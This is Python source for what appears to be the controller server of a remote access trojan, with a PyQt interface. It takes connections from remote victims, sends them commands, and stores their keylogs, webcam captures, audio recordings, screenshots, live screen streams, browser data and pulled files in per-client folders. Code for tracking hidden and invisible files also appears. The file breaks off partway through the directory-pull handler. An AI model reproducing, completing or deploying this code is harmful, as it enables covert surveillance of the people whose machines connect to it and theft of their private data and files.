import socket
import threading
import json
import time
import sys
import os
import base64
import shutil
from datetime import datetime
import hashlib
import struct
import pyaudio
import queue
import numpy as np
import subprocess
from PyQt5.QtWidgets import QApplication, QMainWindow, QLabel, QVBoxLayout, QWidget, QPushButton, QHBoxLayout
from PyQt5.QtCore import QTimer, Qt, pyqtSignal, QObject, QThread
from PyQt5.QtGui import QPixmap, QImage
import cv2
import re
import html
import itertools

class ServerSignals(QObject):
    create_live_screen_window = pyqtSignal(str, object)  # client_id, server
    update_log = pyqtSignal(str)  # message
    update_clients = pyqtSignal(list)  # clients list
    server_stopped = pyqtSignal()  # emitted when server stops

class LiveScreenSignals(QObject):
    update_frame = pyqtSignal(bytes)

class FrameProcessorThread(QThread):
    def __init__(self, client_id, frame_queue, parent=None):
        super().__init__(parent)
        self.client_id = client_id
        self.frame_queue = frame_queue
        self.signals = LiveScreenSignals()
        self.running = True
        self.received_frames = 0
    
    def run(self):
        while self.running:
            try:
                # Get frame from server queue with a short timeout
                frame_data = self.frame_queue.get(timeout=0.5)
                self.received_frames += 1
                self.signals.update_frame.emit(frame_data)
            except queue.Empty:
                # No frame available, continue checking
                continue
            except Exception as e:
                print(f"Frame processing error for {self.client_id}: {e}")
                break
    
    def stop(self):
        self.running = False
        self.wait()

class LiveScreenWindow(QMainWindow):
    def __init__(self, client_id, server=None):
        super().__init__()
        self.client_id = client_id
        self.server = server
        self.setWindowTitle(f"Live Screen - {client_id}")
        self.setGeometry(100, 100, 1024, 768)
        
        # Set window flags to keep on top
        self.setWindowFlags(Qt.WindowStaysOnTopHint)
        
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Layout
        layout = QVBoxLayout(central_widget)
        
        # Screen display label
        self.screen_label = QLabel()
        self.screen_label.setAlignment(Qt.AlignCenter)
        self.screen_label.setStyleSheet("background-color: black;")
        layout.addWidget(self.screen_label)
        
        # Control buttons
        button_layout = QHBoxLayout()
        
        self.stop_button = QPushButton("Stop Streaming")
        self.stop_button.setStyleSheet("QPushButton { background-color: #ff4444; color: white; font-weight: bold; padding: 8px; }")
        self.stop_button.clicked.connect(self.close)
        button_layout.addWidget(self.stop_button)
        
        self.fullscreen_button = QPushButton("Fullscreen")
        self.fullscreen_button.setStyleSheet("QPushButton { background-color: #4444ff; color: white; font-weight: bold; padding: 8px; }")
        self.fullscreen_button.clicked.connect(self.toggle_fullscreen)
        button_layout.addWidget(self.fullscreen_button)
        
        layout.addLayout(button_layout)
        
        # Status label
        self.status_label = QLabel("Connecting...")
        self.status_label.setStyleSheet("color: white; background-color: #333; padding: 5px;")
        layout.addWidget(self.status_label)
        
        # Frame buffer
        self.frame_buffer = queue.Queue(maxsize=10)  # Increased buffer size
        
        # Timer for updating display
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.update_display)
        self.timer.start(30)  # Update display every 30ms
        
        # Frame processor thread
        self.frame_processor = None
        
        # Start frame processing immediately
        self.start_frame_processing()
        
        # Request live screen start
        if self.server:
            try:
                self.server.send_to_client(self.client_id, "live_screen")
                self.status_label.setText("Requested live screen...")
            except Exception as e:
                self.status_label.setText(f"Error: {str(e)}")
    
    def start_frame_processing(self):
        if self.frame_processor is None or not self.frame_processor.isRunning():
            self.frame_processor = FrameProcessorThread(
                self.client_id, 
                self.server.live_screen_queues[self.client_id],
                self
            )
            self.frame_processor.signals.update_frame.connect(self.handle_new_frame)
            self.frame_processor.start()
            self.status_label.setText("Waiting for frames...")
    
    def handle_new_frame(self, frame_data):
        if self.frame_buffer.full():
            try:
                self.frame_buffer.get_nowait()
            except queue.Empty:
                pass
        self.frame_buffer.put(frame_data)
        
        # Update status to show we're receiving frames
        if self.frame_processor and self.frame_processor.received_frames > 0:
            self.status_label.setText(f"Streaming... Frames: {self.frame_processor.received_frames}")
    
    def update_display(self):
        try:
            if not self.frame_buffer.empty():
                frame_data = self.frame_buffer.get()
                img = QImage.fromData(frame_data)
                if img.isNull():
                    return
                
                pixmap = QPixmap.fromImage(img)
                scaled_pixmap = pixmap.scaled(
                    self.screen_label.size(), 
                    Qt.KeepAspectRatio, 
                    Qt.SmoothTransformation
                )
                self.screen_label.setPixmap(scaled_pixmap)
                self.status_label.setText(f"Streaming... Resolution: {img.width()}x{img.height()} | Frames: {self.frame_processor.received_frames if self.frame_processor else 0}")
            else:
                # No frames available yet, show waiting message
                if self.frame_processor and self.frame_processor.received_frames == 0:
                    self.status_label.setText("Waiting for frames...")
        except Exception as e:
            print(f"Display update error: {e}")
            self.status_label.setText(f"Error: {str(e)}")
    
    def toggle_fullscreen(self):
        if self.isFullScreen():
            self.showNormal()
            self.fullscreen_button.setText("Fullscreen")
        else:
            self.showFullScreen()
            self.fullscreen_button.setText("Exit Fullscreen")
    
    def resizeEvent(self, event):
        if hasattr(self, 'screen_label') and self.screen_label.pixmap():
            pixmap = self.screen_label.pixmap()
            scaled_pixmap = pixmap.scaled(
                self.screen_label.size(), 
                Qt.KeepAspectRatio, 
                Qt.SmoothTransformation
            )
            self.screen_label.setPixmap(scaled_pixmap)
        super().resizeEvent(event)
    
    def closeEvent(self, event):
        if self.frame_processor and self.frame_processor.isRunning():
            self.frame_processor.stop()
        
        if self.server:
            try:
                self.server.send_to_client(self.client_id, "live_screen")
            except:
                pass
        
        if hasattr(self.server, 'live_screen_windows'):
            if self.client_id in self.server.live_screen_windows:
                del self.server.live_screen_windows[self.client_id]
        
        super().closeEvent(event)

class RemoteServer(QThread):
    def __init__(self, host='0.0.0.0', port=9999, log_to_file=False):
        super().__init__()
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = []
        self.running = False
        self.lock = threading.Lock()
        self.log_to_file = log_to_file
        self.log_file = None
        self.active_client = None
        self.client_directories = {}
        self.hidden_files = {}
        self.keylog_files = {}
        self.transfer_sessions = {}
        self.live_chat_clients = {}
        self.audio_queues = {}
        self.live_screen_queues = {}
        self.live_screen_windows = {}
        
        # For search highlighting
        self.search_term = None
        self.search_client = None
        self.loading = False
        self.loading_animation = None
        self.loading_thread = None
        
        # Command response tracking
        self.pending_commands = {}  # client_id -> command completion event
        self.command_output_buffer = {}  # client_id -> output buffer
        self.command_start_time = {}  # client_id -> command start time
        self.command_completed = {}  # client_id -> boolean flag
        self.last_output_time = {}  # client_id -> last output timestamp
        self.command_end_markers = {}  # client_id -> expected end markers
        
        # Audio settings
        self.audio_format = pyaudio.paInt16
        self.channels = 1
        self.rate = 44100
        self.chunk = 512
        self.audio = pyaudio.PyAudio()
        
        # Signals for communication with main thread
        self.signals = ServerSignals()
        
        # Whitelisted commands that won't be sent to clients
        self.whitelisted_commands = ['remote']
        
        if self.log_to_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.log_file = f"remote_server_{timestamp}.txt"
            with open(self.log_file, 'w') as f:
                f.write(f"Remote Server Log - Started at {datetime.now()}\n")
                f.write("=" * 50 + "\n")
    
    def log_message(self, message):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        formatted_msg = f"[{timestamp}] {message}"
        
        # Check if we need to highlight search terms
        if self.search_term and self.search_client and "[OUTPUT]" in message:
            # Extract client ID from the message
            client_match = re.search(r'\[OUTPUT\] \[([^\]]+)\]', message)
            if client_match and client_match.group(1) == self.search_client:
                # Highlight the search term
                highlighted_msg = self.highlight_search_term(formatted_msg, self.search_term)
                print(highlighted_msg)
            else:
                print(formatted_msg)
        else:
            # Check if message contains directory path to color it red
            if "Directory updated to:" in formatted_msg:
                # Split the message to separate the path
                parts = formatted_msg.split("Directory updated to: ", 1)
                if len(parts) == 2:
                    # Color the path part red
                    console_msg = parts[0] + "Directory updated to: " + "\033[91m" + parts[1] + "\033[0m"
                    print(console_msg)
                else:
                    print(formatted_msg)
            else:
                print(formatted_msg)
        
        # Emit signal to update GUI log
        self.signals.update_log.emit(formatted_msg)
        
        if self.log_to_file and self.log_file:
            with open(self.log_file, 'a') as f:
                f.write(formatted_msg + "\n")
        
        # Stop loading animation if we're receiving output from the client
        if self.loading and "[OUTPUT]" in message:
            client_match = re.search(r'\[OUTPUT\] \[([^\]]+)\]', message)
            if client_match:
                client_id = client_match.group(1)
                if (self.active_client and client_id == self.active_client) or \
                   (self.search_client and client_id == self.search_client):
                    self.stop_loading_animation()
    
    def highlight_search_term(self, text, term):
        if not term:
            return text
        
        # ANSI escape codes for highlighting
        highlight_start = "\033[1;33m"  # Yellow bold
        highlight_end = "\033[0m"  # Reset
        
        # Use regex to find and replace all occurrences of the search term
        # This ensures we match the exact term and handle special regex characters
        pattern = re.compile(re.escape(term))
        highlighted_text = pattern.sub(f"{highlight_start}{term}{highlight_end}", text)
        
        return highlighted_text
    
    def start_loading_animation(self):
        self.loading = True
        self.loading_animation = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        
        def animate():
            while self.loading:
                sys.stdout.write(f"\rLoading {next(self.loading_animation)}")
                sys.stdout.flush()
                time.sleep(0.1)
            sys.stdout.write("\r" + " " * 20 + "\r")  # Clear the loading line
            sys.stdout.flush()
        
        self.loading_thread = threading.Thread(target=animate)
        self.loading_thread.daemon = True
        self.loading_thread.start()
    
    def stop_loading_animation(self):
        self.loading = False
        if self.loading_thread and self.loading_thread.is_alive():
            self.loading_thread.join(timeout=0.5)
    
    def get_timestamp(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def calculate_file_checksum(self, file_path):
        sha256 = hashlib.sha256()
        with open(file_path, 'rb') as f:
            while True:
                data = f.read(65536)
                if not data:
                    break
                sha256.update(data)
        return sha256.hexdigest()
    
    def run(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            self.log_message(f"Server started on {self.host}:{self.port}")
            self.log_message("Waiting for connections...")
            
            # Start command thread
            cmd_thread = threading.Thread(target=self.command_handler)
            cmd_thread.daemon = True
            cmd_thread.start()
            
            # Accept connections
            while self.running:
                try:
                    client_socket, addr = self.server_socket.accept()
                    client_id = f"client-{len(self.clients)+1}"
                    
                    with self.lock:
                        self.clients.append({
                            'socket': client_socket,
                            'addr': addr,
                            'id': client_id
                        })
                        self.client_directories[client_id] = "~"
                        self.hidden_files[client_id] = set()
                        
                        keylog_dir = f"keylogs/{client_id}"
                        os.makedirs(keylog_dir, exist_ok=True)
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        keylog_path = os.path.join(keylog_dir, f"keylog_{timestamp}.txt")
                        self.keylog_files[client_id] = keylog_path
                        
                        self.audio_queues[client_id] = queue.Queue()
                        self.live_screen_queues[client_id] = queue.Queue(maxsize=30)
                        
                        # Initialize command tracking for this client
                        self.pending_commands[client_id] = threading.Event()
                        self.command_output_buffer[client_id] = []
                        self.command_start_time[client_id] = 0
                        self.command_completed[client_id] = False
                        self.last_output_time[client_id] = 0
                        self.command_end_markers[client_id] = None
                    
                    self.log_message(f"New connection from {addr[0]}:{addr[1]} as {client_id}")
                    
                    # Request initial directory
                    try:
                        client_socket.send("pwd".encode('utf-8'))
                    except:
                        pass
                    
                    # Start client handler thread
                    client_thread = threading.Thread(
                        target=self.handle_client, 
                        args=(client_socket, addr, client_id)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                    # Update client list in GUI
                    self.update_clients_list()
                    
                except socket.error as e:
                    if self.running:
                        self.log_message(f"Socket error: {e}")
                    
        except Exception as e:
            self.log_message(f"Server error: {e}")
        finally:
            self.stop()
    
    def update_clients_list(self):
        with self.lock:
            clients_list = []
            for client in self.clients:
                current_dir = self.client_directories.get(client['id'], "~")
                status = " [ACTIVE]" if client['id'] == self.active_client else ""
                chat_status = " [LIVE CHAT]" if client['id'] in self.live_chat_clients else ""
                screen_status = " [LIVE SCREEN]" if client['id'] in self.live_screen_queues else ""
                
                clients_list.append({
                    'id': client['id'],
                    'addr': f"{client['addr'][0]}:{client['addr'][1]}",
                    'dir': current_dir,
                    'status': status,
                    'chat_status': chat_status,
                    'screen_status': screen_status
                })
            
            self.signals.update_clients.emit(clients_list)
    
    def handle_client(self, client_socket, addr, client_id):
        try:
            while self.running:
                # Check for binary markers first
                peek_data = client_socket.recv(1024, socket.MSG_PEEK)
                if not peek_data:
                    break
                
                # Handle different binary markers
                if peek_data.startswith(b'[UPLOAD_FILE:'):
                    self.handle_upload_file(client_socket, client_id)
                elif peek_data.startswith(b'[WEBCAM:'):
                    self.handle_webcam(client_socket, client_id)
                elif peek_data.startswith(b'[AUDIO:'):
                    self.handle_audio(client_socket, client_id)
                elif peek_data.startswith(b'[SCREENSHOT:'):
                    self.handle_screenshot(client_socket, client_id)
                elif peek_data.startswith(b'[PULL_FILE:'):
                    self.handle_pull_file(client_socket, client_id)
                elif peek_data.startswith(b'[PULL_DIR:'):
                    self.handle_pull_dir(client_socket, client_id)
                elif peek_data.startswith(b'[PULL_CONFIRM:'):
                    self.handle_pull_confirm(client_socket, client_id)
                elif peek_data.startswith(b'[LIVE_AUDIO:'):
                    self.handle_live_audio(client_socket, client_id)
                elif peek_data.startswith(b'[LIVE_CHAT_START]'):
                    # Consume the message from the buffer
                    client_socket.recv(len(b'[LIVE_CHAT_START]'))
                    self.handle_live_chat_start(client_socket, client_id)
                elif peek_data.startswith(b'[LIVE_CHAT_STOP]'):
                    # Consume the message from the buffer
                    client_socket.recv(len(b'[LIVE_CHAT_STOP]'))
                    self.handle_live_chat_stop(client_socket, client_id)
                elif peek_data.startswith(b'[LIVE_SCREEN:'):
                    self.handle_live_screen(client_socket, client_id)
                elif peek_data.startswith(b'[LIVE_SCREEN_START]'):
                    # Consume the message from the buffer
                    client_socket.recv(len(b'[LIVE_SCREEN_START]'))
                    self.handle_live_screen_start(client_socket, client_id)
                elif peek_data.startswith(b'[LIVE_SCREEN_STOP]'):
                    # Consume the message from the buffer
                    client_socket.recv(len(b'[LIVE_SCREEN_STOP]'))
                    self.handle_live_screen_stop(client_socket, client_id)
                elif peek_data.startswith(b'[BROWSER_DATA:'):
                    self.handle_browser_data(client_socket, client_id)
                else:
                    # Handle text data
                    data = client_socket.recv(4096)
                    if not data:
                        break
                    
                    try:
                        text_data = data.decode('utf-8', errors='ignore')
                        if text_data.startswith("[LOG]"):
                            log_msg = text_data[5:].strip()
                            self.log_message(f"[LOG] [{client_id}] {log_msg}")
                        elif text_data.startswith("[OUTPUT]"):
                            output = text_data[8:].strip()
                            
                            # Check if this is a directory change response
                            if "Changed directory to" in output:
                                # Extract the directory path
                                dir_path = output.split("Changed directory to ")[1].strip()
                                
                                # Clean up the directory path - remove any [DIR] tags or extra text
                                dir_path = re.sub(r'\[DIR\].*$', '', dir_path).strip()
                                
                                with self.lock:
                                    self.client_directories[client_id] = dir_path
                                
                                self.log_message(f"[{client_id}] Directory updated to: {dir_path}")
                                
                                # Mark command as completed
                                with self.lock:
                                    if client_id in self.pending_commands:
                                        self.pending_commands[client_id].set()
                                        self.command_completed[client_id] = True
                                
                                # Skip processing this as regular output to avoid duplication
                                continue
                            elif output.startswith("/"):
                                # Handle directory path starting with /
                                with self.lock:
                                    self.client_directories[client_id] = output
                                self.log_message(f"[{client_id}] Directory updated to: {output}")
                                
                                # Mark command as completed
                                with self.lock:
                                    if client_id in self.pending_commands:
                                        self.pending_commands[client_id].set()
                                        self.command_completed[client_id] = True
                                
                                # Skip processing this as regular output to avoid duplication
                                continue
                            else:
                                # Regular command output
                                self.log_message(f"[OUTPUT] [{client_id}]\n{output}")
                                
                                # Add to output buffer
                                with self.lock:
                                    if client_id in self.command_output_buffer:
                                        self.command_output_buffer[client_id].append(output)
                                    # Update last output time
                                    self.last_output_time[client_id] = time.time()
                                    
                                    # Check for command end markers
                                    if client_id in self.command_end_markers and self.command_end_markers[client_id]:
                                        end_marker = self.command_end_markers[client_id]
                                        if end_marker in output:
                                            # Found the end marker, command is complete
                                            if client_id in self.pending_commands:
                                                self.pending_commands[client_id].set()
                                                self.command_completed[client_id] = True
                                            # Clear the end marker
                                            self.command_end_markers[client_id] = None
                            
                        elif text_data.startswith("[DIR]"):
                            # Extract directory path and clean it
                            dir_data = text_data[5:].strip()
                            
                            # Remove any extra tags or text that might be appended
                            if '[' in dir_data:
                                dir_data = dir_data.split('[')[0].strip()
                            
                            with self.lock:
                                self.client_directories[client_id] = dir_data
                            
                            self.log_message(f"[{client_id}] Directory updated to: {dir_data}")
                            
                            # Mark command as completed for directory updates
                            with self.lock:
                                if client_id in self.pending_commands:
                                    self.pending_commands[client_id].set()
                                    self.command_completed[client_id] = True
                            
                        elif text_data.startswith("[KEYLOG:"):
                            self.handle_keylog(client_socket, client_id, text_data)
                        elif text_data.startswith("[FILE_FLAGS:"):
                            self.handle_file_flags(client_socket, client_id, text_data)
                        elif text_data.startswith("[EXPOSE_FILE:"):
                            self.handle_expose_file(client_socket, client_id, text_data)
                        elif text_data.startswith("[EXPOSE_ALL]"):
                            self.handle_expose_all(client_socket, client_id, text_data)
                        else:
                            self.log_message(f"[{client_id}] {text_data}")
                    except UnicodeDecodeError:
                        self.log_message(f"[{client_id}] Received binary data that couldn't be decoded")
                
        except Exception as e:
            self.log_message(f"Client handler error for {client_id}: {e}")
        finally:
            # Clean up disconnected client
            with self.lock:
                for i, client in enumerate(self.clients):
                    if client['socket'] == client_socket:
                        self.log_message(f"Client {client_id} disconnected")
                        self.clients.pop(i)
                        
                        # Clean up client resources
                        if client_id in self.client_directories:
                            del self.client_directories[client_id]
                        if client_id in self.hidden_files:
                            del self.hidden_files[client_id]
                        if client_id in self.keylog_files:
                            del self.keylog_files[client_id]
                        if client_id in self.transfer_sessions:
                            del self.transfer_sessions[client_id]
                        if client_id in self.live_chat_clients:
                            del self.live_chat_clients[client_id]
                        if client_id in self.audio_queues:
                            del self.audio_queues[client_id]
                        if client_id in self.live_screen_queues:
                            del self.live_screen_queues[client_id]
                        if client_id in self.live_screen_windows:
                            try:
                                self.live_screen_windows[client_id].close()
                            except:
                                pass
                            del self.live_screen_windows[client_id]
                        if client_id in self.pending_commands:
                            del self.pending_commands[client_id]
                        if client_id in self.command_output_buffer:
                            del self.command_output_buffer[client_id]
                        if client_id in self.command_start_time:
                            del self.command_start_time[client_id]
                        if client_id in self.command_completed:
                            del self.command_completed[client_id]
                        if client_id in self.last_output_time:
                            del self.last_output_time[client_id]
                        if client_id in self.command_end_markers:
                            del self.command_end_markers[client_id]
                        if self.active_client == client_id:
                            self.active_client = None
                        break
            
            # Update client list in GUI
            self.update_clients_list()
            client_socket.close()
    
    def handle_upload_file(self, client_socket, client_id):
        """Handle file upload from client"""
        # First, read the header
        header_buffer = b""
        while True:
            chunk = client_socket.recv(1)
            if not chunk:
                return
            header_buffer += chunk
            if chunk == b']':
                break
        
        # Parse header
        try:
            header = header_buffer.decode('utf-8')
            parts = header[1:-1].split(':')  # Remove brackets and split
            if len(parts) < 5:
                self.log_message(f"Invalid header format from {client_id}")
                return
                
            filename = parts[1]
            size = int(parts[2])
            hide_flag = (parts[3] == "1")
            invisible_flag = (parts[4] == "1")
            
            self.log_message(f"Receiving file: {filename} ({size} bytes)")
            
            # Create save directory if it doesn't exist
            save_dir = f"uploads/{client_id}"
            os.makedirs(save_dir, exist_ok=True)
            
            # Save path for the file
            save_path = os.path.join(save_dir, filename)
            
            # Read exactly the number of bytes specified in the header
            bytes_received = 0
            with open(save_path, 'wb') as f:
                while bytes_received < size:
                    # Calculate how many bytes we still need to receive
                    remaining = size - bytes_received
                    # Read up to 4096 bytes at a time
                    chunk_size = min(4096, remaining)
                    chunk = client_socket.recv(chunk_size)
                    if not chunk:
                        # Connection closed prematurely
                        self.log_message(f"ERROR: Connection closed while receiving file data")
                        break
                    # Write the chunk directly to the file
                    f.write(chunk)
                    bytes_received += len(chunk)
            
            # Verify we received all bytes
            if bytes_received != size:
                self.log_message(f"ERROR: Expected {size} bytes, received {bytes_received}")
                # Delete the incomplete file
                if os.path.exists(save_path):
                    os.remove(save_path)
                return
            else:
                self.log_message(f"File successfully saved: {save_path}")
            
            # Track hidden/invisible files
            if hide_flag or invisible_flag:
                with self.lock:
                    file_flags = ""
                    if hide_flag:
                        file_flags += "H"
                    if invisible_flag:
                        file_flags += "I"
                    self.hidden_files[client_id].add((filename, file_flags))
                
                self.log_message(f"File marked as {('hidden ' if hide_flag else '')}{('invisible' if invisible_flag else '')}")
                
        except Exception as e:
            self.log_message(f"Error handling file upload from {client_id}: {e}")
            import traceback
            self.log_message(traceback.format_exc())
    
    def handle_webcam(self, client_socket, client_id):
        """Handle webcam image from client"""
        # First, read the header
        header_buffer = b""
        while True:
            chunk = client_socket.recv(1)
            if not chunk:
                return
            header_buffer += chunk
            if chunk == b']':
                break
        
        # Parse header
        try:
            header = header_buffer.decode('utf-8')
            parts = header[1:-1].split(':')  # Remove brackets and split
            if len(parts) < 3:
                self.log_message(f"Invalid header format from {client_id}")
                return
                
            filename = parts[1]
            size = int(parts[2])
            
            self.log_message(f"Receiving webcam image: {filename} ({size} bytes)")
            
            # Create save directory if it doesn't exist
            save_dir = f"webcam/{client_id}"
            os.makedirs(save_dir, exist_ok=True)
            
            # Open file in binary mode for writing
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            save_path = os.path.join(save_dir, f"webcam_{timestamp}_{filename}")
            
            # Read exactly the number of bytes specified in the header
            bytes_received = 0
            with open(save_path, 'wb') as f:
                while bytes_received < size:
                    # Calculate how many bytes we still need to receive
                    remaining = size - bytes_received
                    # Read up to 4096 bytes at a time
                    chunk_size = min(4096, remaining)
                    chunk = client_socket.recv(chunk_size)
                    if not chunk:
                        # Connection closed prematurely
                        self.log_message(f"ERROR: Connection closed while receiving webcam data")
                        break
                    # Write the chunk directly to the file
                    f.write(chunk)
                    bytes_received += len(chunk)
            
            # Verify we received all bytes
            if bytes_received != size:
                self.log_message(f"ERROR: Expected {size} bytes, received {bytes_received}")
                # Delete the incomplete file
                if os.path.exists(save_path):
                    os.remove(save_path)
                return
            else:
                self.log_message(f"Webcam image successfully saved: {save_path}")
                
        except Exception as e:
            self.log_message(f"Error handling webcam image from {client_id}: {e}")
            import traceback
            self.log_message(traceback.format_exc())
    
    def handle_audio(self, client_socket, client_id):
        """Handle audio recording from client"""
        # First, read the header
        header_buffer = b""
        while True:
            chunk = client_socket.recv(1)
            if not chunk:
                return
            header_buffer += chunk
            if chunk == b']':
                break
        
        # Parse header
        try:
            header = header_buffer.decode('utf-8')
            parts = header[1:-1].split(':')  # Remove brackets and split
            if len(parts) < 3:
                self.log_message(f"Invalid header format from {client_id}")
                return
                
            filename = parts[1]
            size = int(parts[2])
            
            self.log_message(f"Receiving audio recording: {filename} ({size} bytes)")
            
            # Create save directory if it doesn't exist
            save_dir = f"audio/{client_id}"
            os.makedirs(save_dir, exist_ok=True)
            
            # Open file in binary mode for writing
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            save_path = os.path.join(save_dir, f"audio_{timestamp}_{filename}")
            
            # Read exactly the number of bytes specified in the header
            bytes_received = 0
            with open(save_path, 'wb') as f:
                while bytes_received < size:
                    # Calculate how many bytes we still need to receive
                    remaining = size - bytes_received
                    # Read up to 4096 bytes at a time
                    chunk_size = min(4096, remaining)
                    chunk = client_socket.recv(chunk_size)
                    if not chunk:
                        # Connection closed prematurely
                        self.log_message(f"ERROR: Connection closed while receiving audio data")
                        break
                    # Write the chunk directly to the file
                    f.write(chunk)
                    bytes_received += len(chunk)
            
            # Verify we received all bytes
            if bytes_received != size:
                self.log_message(f"ERROR: Expected {size} bytes, received {bytes_received}")
                # Delete the incomplete file
                if os.path.exists(save_path):
                    os.remove(save_path)
                return
            else:
                self.log_message(f"Audio recording successfully saved: {save_path}")
                
        except Exception as e:
            self.log_message(f"Error handling audio recording from {client_id}: {e}")
            import traceback
            self.log_message(traceback.format_exc())
    
    def handle_screenshot(self, client_socket, client_id):
        """Handle screenshot from client"""
        # First, read the header
        header_buffer = b""
        while True:
            chunk = client_socket.recv(1)
            if not chunk:
                return
            header_buffer += chunk
            if chunk == b']':
                break
        
        # Parse header
        try:
            header = header_buffer.decode('utf-8')
            parts = header[1:-1].split(':')  # Remove brackets and split
            if len(parts) < 3:
                self.log_message(f"Invalid header format from {client_id}")
                return
                
            filename = parts[1]
            size = int(parts[2])
            
            self.log_message(f"Receiving screenshot: {filename} ({size} bytes)")
            
            # Create save directory if it doesn't exist
            save_dir = f"screenshots/{client_id}"
            os.makedirs(save_dir, exist_ok=True)
            
            # Open file in binary mode for writing
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            save_path = os.path.join(save_dir, f"screenshot_{timestamp}_{filename}")
            
            # Read exactly the number of bytes specified in the header
            bytes_received = 0
            with open(save_path, 'wb') as f:
                while bytes_received < size:
                    # Calculate how many bytes we still need to receive
                    remaining = size - bytes_received
                    # Read up to 4096 bytes at a time
                    chunk_size = min(4096, remaining)
                    chunk = client_socket.recv(chunk_size)
                    if not chunk:
                        # Connection closed prematurely
                        self.log_message(f"ERROR: Connection closed while receiving screenshot data")
                        break
                    # Write the chunk directly to the file
                    f.write(chunk)
                    bytes_received += len(chunk)
            
            # Verify we received all bytes
            if bytes_received != size:
                self.log_message(f"ERROR: Expected {size} bytes, received {bytes_received}")
                # Delete the incomplete file
                if os.path.exists(save_path):
                    os.remove(save_path)
                return
            else:
                self.log_message(f"Screenshot successfully saved: {save_path}")
                
        except Exception as e:
            self.log_message(f"Error handling screenshot from {client_id}: {e}")
            import traceback
            self.log_message(traceback.format_exc())
    
    def handle_pull_file(self, client_socket, client_id):
        """Handle file pull from client with proper binary handling"""
        # First, read the header
        header_buffer = b""
        while True:
            chunk = client_socket.recv(1)
            if not chunk:
                return
            header_buffer += chunk
            if chunk == b']':
                break
        
        # Parse header
        try:
            header = header_buffer.decode('utf-8')
            parts = header[1:-1].split(':')  # Remove brackets and split
            if len(parts) < 3:
                self.log_message(f"Invalid header format from {client_id}")
                return
                
            filename = parts[1]
            size = int(parts[2])
            
            self.log_message(f"Receiving file: {filename} ({size} bytes)")
            
            # Create save directory if it doesn't exist
            save_dir = f"downloads/{client_id}"
            os.makedirs(save_dir, exist_ok=True)
            
            # Open file in binary mode for writing
            save_path = os.path.join(save_dir, filename)
            
            # Track transfer session
            transfer_id = f"{client_id}-{filename}"
            with self.lock:
                self.transfer_sessions[transfer_id] = {
                    'received': 0,
                    'total': size,
                    'path': save_path,
                    'start_time': time.time()
                }
            
            # Read exactly the number of bytes specified in the header
            bytes_received = 0
            with open(save_path, 'wb') as f:
                while bytes_received < size:
                    # Calculate how many bytes we still need to receive
                    remaining = size - bytes_received
                    # Read up to 4096 bytes at a time
                    chunk_size = min(4096, remaining)
                    chunk = client_socket.recv(chunk_size)
                    if not chunk:
                        # Connection closed prematurely
                        self.log_message(f"ERROR: Connection closed while receiving file data")
                        break
                    # Write the chunk directly to the file
                    f.write(chunk)
                    bytes_received += len(chunk)
                    
                    # Update transfer progress
                    with self.lock:
                        if transfer_id in self.transfer_sessions:
                            self.transfer_sessions[transfer_id]['received'] = bytes_received
            
            # Verify we received all bytes
            if bytes_received != size:
                self.log_message(f"ERROR: Expected {size} bytes, received {bytes_received}")
                # Delete the incomplete file
                if os.path.exists(save_path):
                    os.remove(save_path)
                # Clean up transfer session
                with self.lock:
                    if transfer_id in self.transfer_sessions:
                        del self.transfer_sessions[transfer_id]
                return
            else:
                # Calculate and verify checksum
                checksum = self.calculate_file_checksum(save_path)
                transfer_time = time.time() - self.transfer_sessions[transfer_id]['start_time']
                self.log_message(f"File successfully saved: {save_path}")
                self.log_message(f"Checksum: {checksum}")
                self.log_message(f"Transfer time: {transfer_time:.2f} seconds")
                
                # Clean up transfer session
                with self.lock:
                    if transfer_id in self.transfer_sessions:
                        del self.transfer_sessions[transfer_id]
                
        except Exception as e:
            self.log_message(f"Error handling file pull from {client_id}: {e}")
            import traceback
            self.log_message(traceback.format_exc())
    
    def handle_pull_dir(self, client_socket, client_id):
        """Handle directory pull from client with proper binary handling"""
        # First, read the header
        header_buffer = b""
        while True:
            chunk = client_socket.recv(1)
            if not chunk:
                return
            header_buffer += chunk
            if chunk == b']':
                break
        
        # Parse header
        try:
            header = header_buffer.decode('utf-8')
            parts = header[1:-1].split(':')  # Remove brackets and split
            if len(parts) < 3:
                self.log_message(f"Invalid header format from {client_id}")
                return
                
            dirname = parts[1]
            size = int(parts[2])
            
            self.log_message(f"Receiving directory: {dirname} ({size} bytes)")
            
            # Create save directory if it doesn't exist
            save_dir = f"downloads/{client_id}/{dirname}"
            os.makedirs(save_dir, exist_ok=True)
            
            # Track transfer session
            transfer_id = f"{client_id}-{dirname}"
            with self.lock:
                self.transfer_sessions[transfer_id] = {
                    'received': 0,
                    'total': size,
                    'path': save_dir,
                    'start_time': time.time()
                }
            
            # Receive directory files
            while True:
                # Wait for file header or end marker
                peek_data = client_socket.recv(1024, socket.MSG_PEEK)
                if not peek_data:
                    break
                    
                if peek_data.startswith(b'[PULL_DIR_FILE:'):
                    # Read file header
                    file_header_buffer = b""
                    while True:
                        chunk = client_socket.recv(1)
                        if not chunk:
                            return
                        file_header_buffer += chunk
                        if chunk == b']':
                            break
                    
                    # Parse file header
                    file_header = file_header_buffer.decode('utf-8')
                    file_parts = file_header[1:-1].split(':')
                    if len(file_parts) < 3:
                        continue
                        
                    rel_path = file_parts[1]
                    file_size = int(file_parts[2])
                    
                    self.log_message(f"Receiving file: {rel_path} ({file_size} bytes)")
                    
                    # Create directory structure
                    file_dir = os.path.join(save_dir, os.path.dirname(rel_path))
                    os.makedirs(file_dir, exist_ok=True)
                    
                    # Open file in binary mode for writing
